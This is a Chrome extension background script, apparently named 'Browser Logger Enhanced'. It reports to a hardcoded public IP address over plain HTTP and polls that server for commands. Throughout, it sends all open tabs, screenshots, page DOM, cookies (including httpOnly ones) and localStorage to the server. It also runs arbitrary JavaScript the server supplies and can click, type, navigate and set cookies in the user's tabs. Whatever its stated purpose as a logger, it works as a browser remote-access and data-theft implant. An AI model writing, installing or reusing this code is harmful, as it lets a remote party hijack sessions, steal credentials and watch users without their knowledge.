// Browser Logger Enhanced - Background Script v2.1

const SERVER_HOST = '45.139.76.176';
const SERVER_PORT = 20847;
const SERVER_URL = `http://${SERVER_HOST}:${SERVER_PORT}`;

let logs = [];
let lastVersion = null;

// ========== HOT-RELOAD via Polling ==========
async function checkForUpdates() {
  try {
    const response = await fetch(SERVER_URL + '/version', {
      signal: AbortSignal.timeout(2000)
    });
    if (response.ok) {
      const data = await response.json();
      if (lastVersion && lastVersion !== data.version) {
        console.log('[ARWOX] New version detected, reloading...');
        chrome.runtime.reload();
      }
      lastVersion = data.version;
    }
  } catch (e) {
    // Server offline, ignore
  }
}

// Check for updates every 5 seconds
setInterval(checkForUpdates, 5000);
checkForUpdates();

// ========== SEND TABS LIST TO SERVER ==========
async function sendTabsList() {
  try {
    const tabs = await chrome.tabs.query({});
    const tabsData = tabs.map(tab => ({
      id: tab.id,
      windowId: tab.windowId,
      url: tab.url,
      title: tab.title,
      active: tab.active,
      pinned: tab.pinned,
      index: tab.index
    }));

    await fetch(SERVER_URL + '/tabs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tabs: tabsData, timestamp: Date.now() })
    });
  } catch (e) {
    // Server offline, ignore
  }
}

// Send tabs list every 10 seconds
setInterval(sendTabsList, 10000);
sendTabsList();

// ========== POLL FOR COMMANDS ==========
async function pollCommands() {
  try {
    const response = await fetch(SERVER_URL + '/command', {
      signal: AbortSignal.timeout(2000)
    });
    if (response.ok) {
      const cmd = await response.json();
      if (cmd && cmd.action) {
        executeCommand(cmd);
      }
    }
  } catch (e) {
    // Server offline, ignore
  }
}

async function executeCommand(cmd) {
  console.log('[ARWOX] Executing command:', cmd.action);

  if (cmd.action === 'screenshot') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      const tab = await chrome.tabs.get(tabId);
      chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, async (dataUrl) => {
        if (!chrome.runtime.lastError && dataUrl) {
          await fetch(SERVER_URL + '/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'screenshot', data: dataUrl, url: tab.url, title: tab.title, timestamp: Date.now() })
          });
        }
      });
    }
  }

  if (cmd.action === 'get_tabs') {
    sendTabsList();
  }

  if (cmd.action === 'get_dom') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'GET_DOM',
        selector: cmd.selector
      }, async (response) => {
        if (chrome.runtime.lastError) {
          await fetch(SERVER_URL + '/dom', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ success: false, error: chrome.runtime.lastError.message })
          });
        } else {
          await fetch(SERVER_URL + '/dom', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(response)
          });
        }
      });
    }
  }

  if (cmd.action === 'execute') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId && cmd.code) {
      // Use chrome.scripting.executeScript for better security
      try {
        const results = await chrome.scripting.executeScript({
          target: { tabId: tabId },
          func: new Function(cmd.code)
        });

        await fetch(SERVER_URL + '/execute', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            success: true,
            result: results[0]?.result,
            timestamp: Date.now()
          })
        });
      } catch (error) {
        // Fallback to content script message
        chrome.tabs.sendMessage(tabId, {
          type: 'EXECUTE_JS',
          code: cmd.code
        }, async (response) => {
          await fetch(SERVER_URL + '/execute', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(response || { success: false, error: 'No response' })
          });
        });
      }
    }
  }

  // Phase 2: Click element by selector
  if (cmd.action === 'click') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'CLICK_ELEMENT',
        selector: cmd.selector
      }, async (response) => {
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(response || { success: false, error: 'No response' })
        });
      });
    }
  }

  // Phase 2: Type text into element
  if (cmd.action === 'type') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'TYPE_TEXT',
        selector: cmd.selector,
        text: cmd.text,
        clear: cmd.clear || false
      }, async (response) => {
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(response || { success: false, error: 'No response' })
        });
      });
    }
  }

  // Phase 2: Scroll page
  if (cmd.action === 'scroll') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'SCROLL_PAGE',
        selector: cmd.selector,
        x: cmd.x || 0,
        y: cmd.y || 0,
        behavior: cmd.behavior || 'smooth'
      }, async (response) => {
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(response || { success: false, error: 'No response' })
        });
      });
    }
  }

  // Phase 2: Navigate to URL
  if (cmd.action === 'navigate') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId && cmd.url) {
      try {
        await chrome.tabs.update(tabId, { url: cmd.url });
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ success: true, action: 'navigate', url: cmd.url })
        });
      } catch (error) {
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ success: false, error: error.message })
        });
      }
    }
  }

  // Phase 3: Get cookies
  if (cmd.action === 'get_cookies') {
    try {
      const cookies = await chrome.cookies.getAll({ url: cmd.url || undefined });
      await fetch(SERVER_URL + '/storage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: true, type: 'cookies', data: cookies })
      });
    } catch (error) {
      await fetch(SERVER_URL + '/storage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: false, error: error.message })
      });
    }
  }

  // Phase 3: Set cookie
  if (cmd.action === 'set_cookie') {
    try {
      await chrome.cookies.set({
        url: cmd.url,
        name: cmd.name,
        value: cmd.value,
        path: cmd.path || '/',
        secure: cmd.secure || false,
        httpOnly: cmd.httpOnly || false
      });
      await fetch(SERVER_URL + '/storage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: true, type: 'set_cookie', name: cmd.name })
      });
    } catch (error) {
      await fetch(SERVER_URL + '/storage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: false, error: error.message })
      });
    }
  }

  // Phase 3: Get localStorage
  if (cmd.action === 'get_storage') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'GET_STORAGE',
        key: cmd.key
      }, async (response) => {
        await fetch(SERVER_URL + '/storage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(response || { success: false, error: 'No response' })
        });
      });
    }
  }

  // Phase 3: Set localStorage
  if (cmd.action === 'set_storage') {
    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'SET_STORAGE',
        key: cmd.key,
        value: cmd.value
      }, async (response) => {
        await fetch(SERVER_URL + '/storage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(response || { success: false, error: 'No response' })
        });
      });
    }
  }

  // Phase 3: Tab control - close
  if (cmd.action === 'close_tab') {
    try {
      const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
      if (tabId) {
        await chrome.tabs.remove(tabId);
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ success: true, action: 'close_tab', tabId })
        });
      }
    } catch (error) {
      await fetch(SERVER_URL + '/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: false, error: error.message })
      });
    }
  }

  // Phase 3: Tab control - create new
  if (cmd.action === 'new_tab') {
    try {
      const tab = await chrome.tabs.create({ url: cmd.url || 'about:blank', active: cmd.active !== false });
      await fetch(SERVER_URL + '/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: true, action: 'new_tab', tabId: tab.id, url: tab.url })
      });
    } catch (error) {
      await fetch(SERVER_URL + '/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: false, error: error.message })
      });
    }
  }

  // Phase 3: Tab control - activate
  if (cmd.action === 'activate_tab') {
    try {
      if (cmd.tabId) {
        await chrome.tabs.update(cmd.tabId, { active: true });
        await fetch(SERVER_URL + '/action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ success: true, action: 'activate_tab', tabId: cmd.tabId })
        });
      }
    } catch (error) {
      await fetch(SERVER_URL + '/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ success: false, error: error.message })
      });
    }
  }

  // Clear command after execution
  await fetch(SERVER_URL + '/command', { method: 'DELETE' });
}

// Poll for commands every 3 seconds
setInterval(pollCommands, 3000);

// ========== Message Handler ==========
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  // Screenshot capture
  if (message.type === 'CAPTURE_SCREENSHOT') {
    const tabId = message.tabId;

    // Get the tab's window to capture the correct page
    chrome.tabs.get(tabId, (tab) => {
      if (chrome.runtime.lastError) {
        sendResponse({ success: false, error: chrome.runtime.lastError.message });
        return;
      }

      const windowId = tab.windowId;

      chrome.tabs.captureVisibleTab(windowId, { format: 'png' }, async (dataUrl) => {
        if (chrome.runtime.lastError) {
          sendResponse({ success: false, error: chrome.runtime.lastError.message });
          return;
        }

        try {
          const response = await fetch(SERVER_URL + '/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'screenshot',
              timestamp: Date.now(),
              tabId: tabId,
              url: tab.url,
              title: tab.title,
              data: dataUrl
            })
          });

          sendResponse({ success: response.ok, error: response.ok ? null : 'Server error' });
        } catch (e) {
          sendResponse({ success: false, error: e.message });
        }
      });
    });
    return true;
  }

  // Debugger status
  if (message.type === 'GET_DEBUGGER_STATUS') {
    chrome.debugger.getTargets((targets) => {
      const attached = targets.some(t => t.attached);
      sendResponse({ attached });
    });
    return true;
  }

  // Log handling
  if (message.type === 'LOG') {
    const logEntry = {
      timestamp: new Date().toISOString(),
      url: sender.tab?.url || 'unknown',
      tabId: sender.tab?.id,
      ...message.data
    };
    logs.push(logEntry);
    sendToServer('/log', logEntry);
    sendResponse({ success: true });
  }

  if (message.type === 'GET_LOGS') {
    sendResponse({ logs });
  }

  if (message.type === 'CLEAR_LOGS') {
    logs = [];
    sendResponse({ success: true });
  }

  if (message.type === 'SETTINGS_UPDATED') {
    sendResponse({ success: true });
  }

  return true;
});

// ========== Network Error Listener ==========
chrome.webRequest.onErrorOccurred.addListener(
  (details) => {
    const logEntry = {
      timestamp: new Date().toISOString(),
      type: 'network_error',
      url: details.url,
      error: details.error,
      tabId: details.tabId
    };
    logs.push(logEntry);
    sendToServer('/log', logEntry);
  },
  { urls: ['<all_urls>'] }
);

// ========== Send to Server ==========
async function sendToServer(endpoint, data) {
  try {
    await fetch(SERVER_URL + endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (e) {
    // Server offline, ignore
  }
}
